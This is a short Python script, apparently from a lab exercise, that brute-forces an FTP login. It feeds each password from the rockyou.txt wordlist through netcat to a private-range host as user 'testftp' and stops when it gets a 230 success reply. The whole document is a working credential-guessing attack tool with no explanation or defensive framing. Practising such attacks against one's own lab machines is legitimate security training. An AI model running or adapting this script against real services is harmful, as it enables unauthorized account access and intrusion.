import subprocess
import signal

FILE="rockyou.txt"
IP="192.168.56.15"
PORT="21"
USER="testftp"

password = []
with open(FILE, 'r', encoding="utf-8", errors="ignore") as f:
    for p in f:
        password.append(p.strip())

for i,t in enumerate(password):
    print("Try n°", i+1, "with", t)
    proc = subprocess.Popen(
        ["nc", IP, PORT],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )

    # Banner
    r = proc.stdout.readline().strip()
    #print(r)

    # USER
    proc.stdin.write(f"USER {USER}\r\n")
    proc.stdin.flush()
    r =  proc.stdout.readline().strip()
    #print(r)

    # PASSWORD
    proc.stdin.write(f"PASS {t}\r\n")
    proc.stdin.flush()
    r = proc.stdout.readline().strip()
    #print(r)

    proc.send_signal(signal.SIGINT)
    proc.wait()
    #print(r)

    if "230" in r:
        print("Password found: " + t)
        break


